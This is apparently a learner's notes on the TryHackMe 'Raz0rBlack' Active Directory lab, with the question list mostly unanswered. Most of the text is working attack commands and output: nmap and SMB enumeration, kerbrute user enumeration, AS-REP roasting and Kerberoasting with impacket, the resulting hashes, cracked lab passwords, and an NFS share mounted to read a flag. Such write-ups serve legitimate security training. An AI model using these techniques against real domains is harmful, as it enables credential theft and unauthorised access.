## questions

What is the Domain Name? 
- raz0rblack.thm
What is Steven's Flag?
-
What is the zip file's password?
- 
What is Ljudmila's Hash?
-
What is Ljudmila's Flag?
-
What is Xyan1d3's password?
- `xyan1d3`:`cyanide9amine5628`
What is Xyan1d3's Flag?
-
What is the root Flag?
-
What is Tyson's Flag?
-
What is the complete top secret?
-
Did you like your cookie?
-


### steps: 
```bash
crackmapexec smb 10.10.176.146  

SMB         10.10.176.146   445    HAVEN-DC         
[*] Windows 10.0 Build 17763 x64 (name:HAVEN-D) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
```

### nmap 
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-05 12:13:39Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-05T12:14:57+00:00; +11h05m14s from scanner time.
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2025-09-04T11:55:13
|_Not valid after:  2026-03-06T11:55:13
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   DNS_Tree_Name: raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-05T12:14:47+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49835/tcp open  msrpc         Microsoft Windows RPC

Network Distance: 2 hops
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 11h05m13s, deviation: 0s, median: 11h05m13s
| smb2-time: 
|   date: 2025-09-05T12:14:49
|_  start_date: N/A

```
-  DNS_Domain_Name: raz0rblack.thm
- 

```bash
Downloads/kerbrute_linux_amd64 userenum -d raz0rblack.thm --dc 10.10.176.146 attacktive/users.txt
```
```
2025/09/04 21:16:13 >  [+] VALID USERNAME:       administrator@raz0rblack.thm
2025/09/04 21:33:01 >  [+] VALID USERNAME:       twilliams@raz0rblack.thm

``` 

- search for user to get tgt
```bash
python3.9 /opt/impacket/examples/GetNPUsers.py THM-AD/svc-admin -no-pass -dc-ip 10.10.35.127
```
```bash
/usr/bin/impacket-GetNPUsers raz0rblack.thm/twilliams -no-pass -dc-ip 10.10.124.230
```
- TGT for twilliams:
```
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:16655d07469899d5944b3fac9cde46e6$f1df147f88b4fac7390115af6b05aa1db086631dd745f2886c99c48b1879f6df95d194f98410912860069e4d8dee5d215e315a62b2c755e6ad277575a1449ff5d7358e79799f86af643cfc6af981b26bc4ef73cf887ebd76d07d3c91bbdf6d4bb49c252bbc74218ed62e8f65f6cca6355081488ec25d68437e55da43c2c344fc76525bf3c0f579bf89d5677985e2d714a76b4b31c93a18cb958ea3818be0b451364c96f5b993a3b9f30ae54dc55a150938a1fb1dba22590db0ec4717d3277ee82770761d1ca0820fd5711bb10a5a55ba43bfe1e9e592b798750cc9356fcfbbe15b4dd4b570e2c83d5bb494c238692a2f
```
- cracked AS-PER `roastpotatoes`

- Enumerate shares with twilliams username and password
```bash
smbclient -L 10.10.124.230 -U twilliams 

Password for [WORKGROUP\twilliams]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        trash           Disk      Files Pending for deletion
```
smbclient \\\\10.10.124.230\\NETLOGON -U twilliams 
- try to get tgs
```bash
/usr/bin/impacket-GetUserSPNs  raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.10.222.240 -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>               



[-] CCache file is not found. Skipping...
[-] Principal: raz0rblack.thm\xyan1d3 - Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
- using attack box in thm
```bash
root@ip-10-10-110-164:~# /usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/EGG-INFO/scripts/GetUserSPNs.py raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.10.38.244 -request
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 15:17:17.715160  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$fac5c010a5312dddb9214bcefdd4d823$8811595494bff1094af35b43fc038da0c72b10bf0448f268e19b2502ba2155e7752fe347c48682f6be399fe7a93b53cd18a43a39e234c910321cddd6150c5ac26337606c014eabe07402d22b1689eb385ff4543d497073c4eaba7bb7da802f4c7d71c77446cdda7575e7020c925d4b8c196caef6a83ecbe62aeb886052e0ee588472319c19f7e7fe6ec09923681726e16258f6e5d5a9aec8fa72aabb31c3e2e1ab7864725f06c060b88c0fef8fbfb12ada6c178853b3737efa57d060295a97853a7cd0180f5c7694094e60ee7a61668df021b612dd90a6e370e262cc42a38243bca8e5a942a4f52dee2f71e3040aed86935f5f6e96adb3c77e50c6cd06330c29db8c94ee1360cfd91aff3ab4d2194e407b82fba4508bbb54706e1838b0af66f8d36cac6410239241a74181d2c10b67aa393ece0fcd3eaf6b20bf7c9351d70f19fd49b175f41de98e4629523396132667e2aa9859a1001c63a386f5fbaa63872969e5e290ecc1b25f688422aee668eb82103616ccb4f6b9c38bf88b98aff724291c66343c1c99e3f9548f5c8aca42b553f44915ebe2e0731a1de2c72275fc6f0e84327941db6d644b44c0d9437a08e4c85fbf60380a0134778187961b096e0757f9ea402bca963804af528ef00b1f05e409a486b96162ff7bdf5372a17f13c7f89cc89d9938ffa4fd67507bdf28908dc5bbe49bfb17a8d7c81c27b4b316ff6549770a97e72a3266c035d16f0606541ad8ca01ff579edd25bc13fa77be7f9f867c75b10eacd806c8b22e12920b28b65a605ae1705bbdc690c5c088d5fed6e206c6185786db8ec85e5c372a92d1a5e9b26ef8e868d0fa0e692853833f659d567e2c8683a3ca0b6f9b3781a6ee187e9c045b41d5c68620897697dee8cc46af2e9f86c5b5e2c2946b5407c586fee7320fbe809d8900841e26eec3f215664e3957554f504c70c84abec8d86b7e35ad3490ab56f9fbd09522747002eceaf72bdfe8eb5a966ead0554396f6c71f07894fe8e974670cbeabe0209a9b9b69b2f675b9a9f208f040e33430db4a305153ce00b33ff1abc37d6428b5fd6b074053aa1fec490cfcd32523e00010ead19d7831f8681443becced86be00688ca5ecd9dbceb65c8cf67925a0b34f5e476fa6fb55345b48604266ac86ccb9f7d77583975791c3ae7a2a06f116cbc76587deff9e3b86e023c45cce8745e0ce1bc9fdd647f4f6731eb13da4687dcd31cef76ba29ece25641fb1ae60b2dc2ccfa0d2f3f6ed547e80684bef9c5ca18cae012248dfc957d40432d2543fa3ef92632852876717205239b610a9cdf90ebeefc016a082a119c90c93e2fa93c8bd7cab1a6ee77bf1c6fabb02845d8293115521f0570f0ced41d8dd0227a74e1f544e1ce6c1c427978e4e7f6779a647f092a09b043cf38dae53a8b3479ac
```
- `xyan1d3`:`cyanide9amine5628`

### nfs

```bash
nmap 10.10.176.146 --script="*nfs*"

111/tcp  open  rpcbind
| nfs-statfs: 
|   Filesystem  1K-blocks   Used        Available  Use%  Maxfilesize  Maxlink
|_  /users      20407292.0  16626632.0  3780660.0  82%   16.0T        1023
| nfs-ls: Volume /users
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID         GID         SIZE  TIME                 FILENAME
| rwx------   4294967294  4294967294  64    2021-02-27T17:24:37  .
| ??????????  ?           ?           ?     ?                    ..
| rwx------   4294967294  4294967294  9861  2021-02-25T16:24:06  employee_status.xlsx
| rwx------   4294967294  4294967294  80    2021-02-25T19:31:46  sbradley.txt
```
to get nfs files
```bash
showmount -e $ip
mkdir /tmp/razor
sudo service rpcbind start
sudo mount -t nfs $ip:/users /tmp/razor
```
```bash
Third question
└─$ sudo cat  razor/sbradley.txt         
��THM{ab53e05c9a98def00314a14ccbfa8104}

```
the other file: 
```
daven port		
imogen royce		
tamara vidal		
arthur edwards		
carl ingram		
nolan cassidy		
reza zaydan		
ljudmila vetrova		
rico delgado		
tyson williams		
steven bradley		
chamber lin		
```
